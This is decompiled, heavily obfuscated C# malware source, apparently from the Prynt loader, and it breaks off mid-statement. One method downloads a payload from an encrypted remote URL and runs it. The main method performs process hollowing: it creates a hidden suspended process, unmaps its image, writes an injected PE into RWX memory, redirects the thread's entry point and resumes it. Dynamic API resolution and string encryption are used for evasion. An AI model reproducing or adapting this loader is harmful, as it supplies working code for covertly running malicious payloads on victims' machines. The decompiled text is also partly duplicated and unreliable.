using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using o4HuHur09QNlgH31H9;

namespace Prynt;

public static class LoadExecutor
{
	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void SelfExecute()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		ocugpjv9LU5ZsqSXbx(SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
		WebClient webClient = new WebClient();
		Uri uri = new Uri((string)hyeIf8kQMpw1tHqiUk(28));
		s0VKkwYGaYW52GKDRJ(sQu61aqaHxVWmFoZsF(kjLfjKO7N1UEwYegLO(webClient, uri), shocnZyIWWD07yNZVX()));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public unsafe static bool Execute(LoadParams args)
	{
		//Discarded unreachable code: IL_0002, IL_006b, IL_0c54
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_016c: Incompatible stack heights: 0 vs 1
		//IL_0adc: Incompatible stack heights: 0 vs 1
		//The blocks IL_000e, IL_001a, IL_002b, IL_0035, IL_004d, IL_0062, IL_0078, IL_00e2, IL_00fa, IL_0117, IL_0132, IL_0134, IL_014f, IL_0158, IL_0162, IL_0171, IL_017c, IL_018e, IL_01a5, IL_01b6, IL_01c0, IL_01c2, IL_01d8, IL_01e8, IL_0200, IL_020c, IL_021e, IL_0230, IL_024c, IL_025e, IL_0dea are reachable both inside and outside the pinned region starting at IL_01ef. ILSpy has duplicated these blocks in order to place them both within and outside the `fixed` statement.
		int num = 14;
		CONTEXT cONTEXT = default(CONTEXT);
		CONTEXT cONTEXT2 = default(CONTEXT);
		IMAGE_NT_HEADERS* ptr = default(IMAGE_NT_HEADERS*);
		IntPtr lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU = default(IntPtr);
		byte* ptr4 = default(byte*);
		IMAGE_DOS_HEADER* ptr2 = default(IMAGE_DOS_HEADER*);
		STARTUPINFO lpStartupInfo = default(STARTUPINFO);
		LibInvoker libInvoker2 = default(LibInvoker);
		bool isWow = default(bool);
		PROCESS_INFORMATION lpProcesSystemNetCertPolicyValidationCallbackv = default(PROCESS_INFORMATION);
		IntPtr intPtr2 = default(IntPtr);
		byte[] array = default(byte[]);
		IntPtr intPtr = default(IntPtr);
		IMAGE_SECTION_HEADER* ptr3 = default(IMAGE_SECTION_HEADER*);
		int num5 = default(int);
		ulong num4 = default(ulong);
		ushort num3 = default(ushort);
		bool result = default(bool);
		while (true)
		{
			int num2;
			switch (num)
			{
			case 9:
				cONTEXT = cONTEXT2;
				num = 21;
				break;
			case 18:
				if (ptr->Signature != 17744)
				{
					num = 20;
					break;
				}
				if (ptr->OptionalHeader.Magic == 267)
				{
					TfGZ17dVF9tuwLldwD(xS3F4Guho5lkxZq5iN(args), 920, 2);
					num = 13;
					break;
				}
				num = 22;
				if (!u7ErfqWZ183yXIpHYx())
				{
					break;
				}
				goto case 21;
			case 0:
			case 1:
			case 8:
				lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU = (IntPtr)ptr4;
				num = 6;
				break;
			case 6:
				ptr2 = (IMAGE_DOS_HEADER*)ptr4;
				goto default;
			case 16:
				array2 = null;
				num = 7;
				break;
			case 2:
				lpStartupInfo.cb = ROPbjnbZ7s0xuQg5lx(lpStartupInfo);
				num = 4;
				break;
			case 3:
				libInvoker2 = new LibInvoker((string)hyeIf8kQMpw1tHqiUk(202));
				num = 23;
				break;
			case 22:
				return false;
			case 12:
				if (array2.Length != 0)
				{
					ptr4 = (byte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref array2[0]);
					num = 1;
				}
				else
				{
					num = 5;
				}
				break;
			case 5:
				ptr4 = null;
				_ = 0;
				num = ((!H1DIKAhjafGG6NU9RH()) ? 10 : 0);
				break;
			case 17:
				cONTEXT2 = default(CONTEXT);
				num = 15;
				break;
			default:
				ptr = (IMAGE_NT_HEADERS*)(ptr4 + ptr2->e_lfanew);
				num = 16;
				break;
			case 7:
				if (ptr2->e_magic == 23117)
				{
					num = 18;
					break;
				}
				goto case 20;
			case 20:
				return false;
			case 21:
			{
				object obj = xS3F4Guho5lkxZq5iN(args);
				while (true)
				{
					IL_01ef:
					fixed (byte[] array2 = (byte[])obj)
					{
						if (obj != null)
						{
							num = 12;
							goto IL_0078_2;
						}
						goto IL_0162;
						IL_0078_2:
						while (true)
						{
							switch (num)
							{
							case 16:
								goto end_IL_0078;
							case 9:
								cONTEXT = cONTEXT2;
								num = 21;
								continue;
							case 18:
								if (ptr->Signature != 17744)
								{
									num = 20;
									continue;
								}
								if (ptr->OptionalHeader.Magic == 267)
								{
									TfGZ17dVF9tuwLldwD(xS3F4Guho5lkxZq5iN(args), 920, 2);
									num = 13;
									continue;
								}
								num = 22;
								if (!u7ErfqWZ183yXIpHYx())
								{
									continue;
								}
								goto case 21;
							case 0:
							case 1:
							case 8:
								lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU = (IntPtr)ptr4;
								num = 6;
								continue;
							case 6:
								ptr2 = (IMAGE_DOS_HEADER*)ptr4;
								goto default;
							case 2:
								lpStartupInfo.cb = ROPbjnbZ7s0xuQg5lx(lpStartupInfo);
								num = 4;
								continue;
							case 3:
								libInvoker2 = new LibInvoker((string)hyeIf8kQMpw1tHqiUk(202));
								num = 23;
								continue;
							case 22:
								return false;
							case 12:
								if (array2.Length != 0)
								{
									ptr4 = (byte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref array2[0]);
									num = 1;
								}
								else
								{
									num = 5;
								}
								continue;
							case 5:
								break;
							case 17:
								cONTEXT2 = default(CONTEXT);
								num = 15;
								continue;
							default:
								ptr = (IMAGE_NT_HEADERS*)(ptr4 + ptr2->e_lfanew);
								num = 16;
								continue;
							case 7:
								if (ptr2->e_magic == 23117)
								{
									num = 18;
									continue;
								}
								goto case 20;
							case 20:
								return false;
							case 21:
								obj = xS3F4Guho5lkxZq5iN(args);
								goto IL_01ef;
							case 14:
								isWow = false;
								num = 19;
								continue;
							case 13:
								lpStartupInfo = default(STARTUPINFO);
								num = 2;
								continue;
							case 19:
								lpProcesSystemNetCertPolicyValidationCallbackv = default(PROCESS_INFORMATION);
								num = 17;
								continue;
							case 15:
								cONTEXT2.ContextFlags = 1048603u;
								num = 9;
								if (H1DIKAhjafGG6NU9RH())
								{
									continue;
								}
								goto case 4;
							case 4:
								lpStartupInfo.wShowWindow = 0;
								num = 3;
								continue;
							case 23:
								try
								{
									LibInvoker libInvoker = new LibInvoker((string)hyeIf8kQMpw1tHqiUk(230));
									num2 = 6;
									while (true)
									{
										switch (num2)
										{
										case 13:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 17;
											if (0 == 0)
											{
												break;
											}
											goto case 2;
										case 2:
											libInvoker.CastToDelegate<NativeDelegates.NtUnmapViewOfSectionDelegate>((string)hyeIf8kQMpw1tHqiUk(394))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr2);
											num2 = 63;
											break;
										case 21:
											result = false;
											num2 = 52;
											break;
										case 18:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 41;
											if (true)
											{
												break;
											}
											goto case 30;
										case 30:
											if (isWow)
											{
												num2 = 33;
												if (!u7ErfqWZ183yXIpHYx())
												{
													break;
												}
												goto case 24;
											}
											if (libInvoker2.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>((string)hyeIf8kQMpw1tHqiUk(556))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT))
											{
												goto IL_02d0;
											}
											goto case 53;
										case 5:
											if (!libInvoker2.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>((string)hyeIf8kQMpw1tHqiUk(592))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT))
											{
												num2 = 44;
												break;
											}
											goto IL_0594;
										case 10:
											result = false;
											num2 = 22;
											break;
										case 32:
											if (isWow)
											{
												num2 = 5;
												break;
											}
											if (!libInvoker2.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>((string)hyeIf8kQMpw1tHqiUk(638))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT))
											{
												num2 = 57;
												break;
											}
											goto IL_0594;
										case 67:
											intPtr2 = KYyx7heXmh4xMgMoGB(ptr->OptionalHeader.ImageBase);
											num2 = 2;
											break;
										case 66:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 10;
											if (0 == 0)
											{
												break;
											}
											goto case 0;
										case 0:
											faY4C8V7q0ETgKGXgt(array, 0, intPtr, 8);
											num2 = 61;
											if (!H1DIKAhjafGG6NU9RH())
											{
												return result;
											}
											break;
										case 27:
										case 65:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 20;
											break;
										case 41:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 46;
											break;
										case 3:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 26;
											break;
										case 48:
											if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												num2 = 38;
												break;
											}
											goto IL_0c0b;
										case 11:
											if (!libInvoker2.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>((string)hyeIf8kQMpw1tHqiUk(470))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, KYyx7heXmh4xMgMoGB((long)cONTEXT.Ebx + 8L), intPtr, 4u, IntPtr.Zero))
											{
												num2 = 8;
												break;
											}
											goto IL_0354;
										case 54:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 71;
											if (H1DIKAhjafGG6NU9RH())
											{
												break;
											}
											goto case 34;
										case 34:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 58;
											if (!u7ErfqWZ183yXIpHYx())
											{
												break;
											}
											goto case 14;
										case 14:
											if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												num2 = 45;
												break;
											}
											goto IL_0354;
										case 37:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											goto case 27;
										case 55:
											if (ssg8moaoKTZfb2mJwS(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, IntPtr.Zero))
											{
												num2 = 68;
												break;
											}
											goto case 17;
										case 36:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 64;
											break;
										case 43:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 9;
											if (!u7ErfqWZ183yXIpHYx())
											{
												break;
											}
											goto case 17;
										case 17:
											result = false;
											num2 = 7;
											break;
										case 69:
											result = false;
											num2 = 4;
											break;
										case 63:
											if (RomBjqlmBxxCECpGav(libInvoker2.CastToDelegate<NativeDelegates.VirtualAllocExDelegate>((string)hyeIf8kQMpw1tHqiUk(438))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr2, ptr->OptionalHeader.SizeOfImage, 12288u, 64u), IntPtr.Zero))
											{
												num2 = 28;
												break;
											}
											goto IL_06d9;
										case 64:
											result = false;
											num2 = 1;
											break;
										case 28:
											if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												num2 = 43;
												break;
											}
											goto IL_06d9;
										case 38:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 3;
											break;
										case 6:
											if (!libInvoker2.CastToDelegate<NativeDelegates.CreateProcessInternalWDelegate>((string)hyeIf8kQMpw1tHqiUk(252))(0u, null, (string)vcoArYfecpFmHgnPhp(args), IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 134217740u, IntPtr.Zero, (string)ybQgLBAANPxnNEUBpk(e6uuHKXyeD3Gs4wbnp(JMkonM7KPKXDLgocux())), ref lpStartupInfo, out lpProcesSystemNetCertPolicyValidationCallbackv, 0u))
											{
												num2 = 55;
												break;
											}
											libInvoker2.CastToDelegate<NativeDelegates.IsWow64ProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(362))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, ref isWow);
											num2 = 67;
											break;
										case 16:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 13;
											break;
										case 35:
											if (!libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												goto IL_02d0;
											}
											num2 = 15;
											if (0 == 0)
											{
												break;
											}
											goto case 33;
										case 33:
											if (!libInvoker2.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>((string)hyeIf8kQMpw1tHqiUk(510))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT))
											{
												num2 = 35;
												break;
											}
											goto IL_02d0;
										case 12:
											if (!libInvoker2.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>((string)hyeIf8kQMpw1tHqiUk(470))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, KYyx7heXmh4xMgMoGB(intPtr2.ToInt64() + ptr3->VirtualAddress), KYyx7heXmh4xMgMoGB(lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + ptr3->PointerToRawData), ptr3->SizeOfRawData, IntPtr.Zero))
											{
												num2 = 48;
												break;
											}
											goto IL_0c0b;
										case 42:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 21;
											break;
										case 61:
											num5++;
											num2 = 40;
											break;
										case 59:
											array = new byte[8];
											num2 = 23;
											break;
										case 29:
											cONTEXT.Eax = (uint)(intPtr2.ToInt64() + ptr->OptionalHeader.AddressOfEntryPoint);
											num2 = 32;
											break;
										case 68:
											if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												num2 = 16;
												break;
											}
											goto case 17;
										case 26:
											result = false;
											num2 = 47;
											break;
										case 56:
											result = false;
											num2 = 70;
											break;
										case 23:
											num5 = 0;
											num2 = 24;
											if (true)
											{
												break;
											}
											goto case 53;
										case 53:
											if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												num2 = 34;
												break;
											}
											goto IL_02d0;
										case 51:
											if (num5 == 7)
											{
												num2 = 0;
												break;
											}
											goto case 61;
										case 49:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 36;
											break;
										case 58:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 69;
											if (u7ErfqWZ183yXIpHYx())
											{
											}
											break;
										case 9:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 56;
											break;
										case 44:
											if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												num2 = 49;
												break;
											}
											goto IL_0594;
										case 46:
											result = false;
											H1DIKAhjafGG6NU9RH();
											if (u7ErfqWZ183yXIpHYx())
											{
												num2 = 27;
												if (H1DIKAhjafGG6NU9RH())
												{
													break;
												}
												goto case 55;
											}
											num2 = 50;
											break;
										case 62:
											num4 = (ulong)intPtr2.ToInt64();
											num2 = 59;
											break;
										case 24:
										case 40:
											if (num5 < 8)
											{
												array[num5] = (byte)(num4 >> num5 * 8);
												num2 = 51;
												if (1 == 0)
												{
													return result;
												}
											}
											else
											{
												num2 = 11;
											}
											break;
										case 57:
											if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												num2 = 37;
												break;
											}
											goto IL_0594;
										case 25:
										case 31:
											if (num3 < ptr->FileHeader.NumberOfSections)
											{
												ptr3 = (IMAGE_SECTION_HEADER*)(lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + ptr2->e_lfanew + UBCRs2MjCDw5sBrlGV(zHbqiUFwJD0yvXv2xo(typeof(IMAGE_NT_HEADERS).TypeHandle)) + UBCRs2MjCDw5sBrlGV(zHbqiUFwJD0yvXv2xo(typeof(IMAGE_SECTION_HEADER).TypeHandle)) * num3);
												num2 = 12;
											}
											else
											{
												num2 = 30;
											}
											break;
										case 39:
											if (!libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
											{
												goto IL_0417;
											}
											num2 = 18;
											if (H1DIKAhjafGG6NU9RH())
											{
												break;
											}
											goto case 8;
										case 8:
											bce0rcUmwLW6IfYsHg(intPtr);
											num2 = 14;
											if (true)
											{
												break;
											}
											goto case 20;
										case 20:
											result = false;
											num2 = 60;
											break;
										case 15:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 42;
											break;
										default:
											num2 = 53;
											break;
										case 45:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
											num2 = 66;
											if (0 == 0)
											{
												break;
											}
											goto case 71;
										case 71:
											libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											goto end_IL_0c61;
										case 1:
											return result;
										case 4:
											return result;
										case 7:
											return result;
										case 19:
										case 50:
											return result;
										case 22:
											return result;
										case 47:
											return result;
										case 52:
											return result;
										case 60:
											return result;
										case 70:
											{
												return result;
											}
											IL_0c0b:
											num3 = (ushort)(num3 + 1);
											num2 = 31;
											if (u7ErfqWZ183yXIpHYx())
											{
											}
											break;
											IL_02d0:
											intPtr = T1q2hfC7gLYWB0rhJi(8);
											num2 = 62;
											break;
											IL_06d9:
											if (libInvoker2.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>((string)hyeIf8kQMpw1tHqiUk(470))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr2, lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU, ptr->OptionalHeader.SizeOfHeaders, IntPtr.Zero))
											{
												goto IL_0417;
											}
											num2 = 39;
											if (H1DIKAhjafGG6NU9RH())
											{
												break;
											}
											goto case 28;
											IL_0594:
											libInvoker2.CastToDelegate<NativeDelegates.ResumeThreadDelegate>((string)hyeIf8kQMpw1tHqiUk(674))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
											num2 = 54;
											if (true)
											{
												break;
											}
											goto case 37;
											IL_0417:
											num3 = 0;
											num2 = 25;
											if (true)
											{
												break;
											}
											goto case 27;
											IL_0354:
											bce0rcUmwLW6IfYsHg(intPtr);
											num2 = 29;
											break;
										}
										continue;
										end_IL_0c61:
										break;
									}
								}
								finally
								{
									if (libInvoker2 != null)
									{
										fjDxPK5gg2FIKlNcb4(libInvoker2);
									}
								}
								return true;
							}
							goto IL_0162;
							continue;
							end_IL_0078:
							break;
						}
						goto end_IL_01f1;
						IL_0162:
						ptr4 = null;
						_ = 0;
						num = ((!H1DIKAhjafGG6NU9RH()) ? 10 : 0);
						goto IL_0078_2;
						end_IL_01f1:;
					}
					break;
				}
				goto case 16;
			}
			case 14:
				isWow = false;
				num = 19;
				break;
			case 13:
				lpStartupInfo = default(STARTUPINFO);
				num = 2;
				break;
			case 19:
				lpProcesSystemNetCertPolicyValidationCallbackv = default(PROCESS_INFORMATION);
				num = 17;
				break;
			case 15:
				cONTEXT2.ContextFlags = 1048603u;
				num = 9;
				if (H1DIKAhjafGG6NU9RH())
				{
					break;
				}
				goto case 4;
			case 4:
				lpStartupInfo.wShowWindow = 0;
				num = 3;
				break;
			case 23:
				try
				{
					LibInvoker libInvoker = new LibInvoker((string)hyeIf8kQMpw1tHqiUk(230));
					num2 = 6;
					while (true)
					{
						switch (num2)
						{
						case 13:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 17;
							if (0 == 0)
							{
								break;
							}
							goto case 2;
						case 2:
							libInvoker.CastToDelegate<NativeDelegates.NtUnmapViewOfSectionDelegate>((string)hyeIf8kQMpw1tHqiUk(394))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr2);
							num2 = 63;
							break;
						case 21:
							result = false;
							num2 = 52;
							break;
						case 18:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 41;
							if (true)
							{
								break;
							}
							goto case 30;
						case 30:
							if (isWow)
							{
								num2 = 33;
								if (!u7ErfqWZ183yXIpHYx())
								{
									break;
								}
								goto case 24;
							}
							if (libInvoker2.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>((string)hyeIf8kQMpw1tHqiUk(556))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT))
							{
								goto IL_02d0_2;
							}
							goto case 53;
						case 5:
							if (!libInvoker2.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>((string)hyeIf8kQMpw1tHqiUk(592))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT))
							{
								num2 = 44;
								break;
							}
							goto IL_0594_2;
						case 10:
							result = false;
							num2 = 22;
							break;
						case 32:
							if (isWow)
							{
								num2 = 5;
								break;
							}
							if (!libInvoker2.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>((string)hyeIf8kQMpw1tHqiUk(638))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT))
							{
								num2 = 57;
								break;
							}
							goto IL_0594_2;
						case 67:
							intPtr2 = KYyx7heXmh4xMgMoGB(ptr->OptionalHeader.ImageBase);
							num2 = 2;
							break;
						case 66:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 10;
							if (0 == 0)
							{
								break;
							}
							goto case 0;
						case 0:
							faY4C8V7q0ETgKGXgt(array, 0, intPtr, 8);
							num2 = 61;
							if (!H1DIKAhjafGG6NU9RH())
							{
								return result;
							}
							break;
						case 27:
						case 65:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 20;
							break;
						case 41:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 46;
							break;
						case 3:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 26;
							break;
						case 48:
							if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								num2 = 38;
								break;
							}
							goto IL_0c0b_2;
						case 11:
							if (!libInvoker2.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>((string)hyeIf8kQMpw1tHqiUk(470))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, KYyx7heXmh4xMgMoGB((long)cONTEXT.Ebx + 8L), intPtr, 4u, IntPtr.Zero))
							{
								num2 = 8;
								break;
							}
							goto IL_0354_2;
						case 54:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 71;
							if (H1DIKAhjafGG6NU9RH())
							{
								break;
							}
							goto case 34;
						case 34:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 58;
							if (!u7ErfqWZ183yXIpHYx())
							{
								break;
							}
							goto case 14;
						case 14:
							if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								num2 = 45;
								break;
							}
							goto IL_0354_2;
						case 37:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							goto case 27;
						case 55:
							if (ssg8moaoKTZfb2mJwS(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, IntPtr.Zero))
							{
								num2 = 68;
								break;
							}
							goto case 17;
						case 36:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 64;
							break;
						case 43:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 9;
							if (!u7ErfqWZ183yXIpHYx())
							{
								break;
							}
							goto case 17;
						case 17:
							result = false;
							num2 = 7;
							break;
						case 69:
							result = false;
							num2 = 4;
							break;
						case 63:
							if (RomBjqlmBxxCECpGav(libInvoker2.CastToDelegate<NativeDelegates.VirtualAllocExDelegate>((string)hyeIf8kQMpw1tHqiUk(438))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr2, ptr->OptionalHeader.SizeOfImage, 12288u, 64u), IntPtr.Zero))
							{
								num2 = 28;
								break;
							}
							goto IL_06d9_2;
						case 64:
							result = false;
							num2 = 1;
							break;
						case 28:
							if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								num2 = 43;
								break;
							}
							goto IL_06d9_2;
						case 38:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 3;
							break;
						case 6:
							if (!libInvoker2.CastToDelegate<NativeDelegates.CreateProcessInternalWDelegate>((string)hyeIf8kQMpw1tHqiUk(252))(0u, null, (string)vcoArYfecpFmHgnPhp(args), IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 134217740u, IntPtr.Zero, (string)ybQgLBAANPxnNEUBpk(e6uuHKXyeD3Gs4wbnp(JMkonM7KPKXDLgocux())), ref lpStartupInfo, out lpProcesSystemNetCertPolicyValidationCallbackv, 0u))
							{
								num2 = 55;
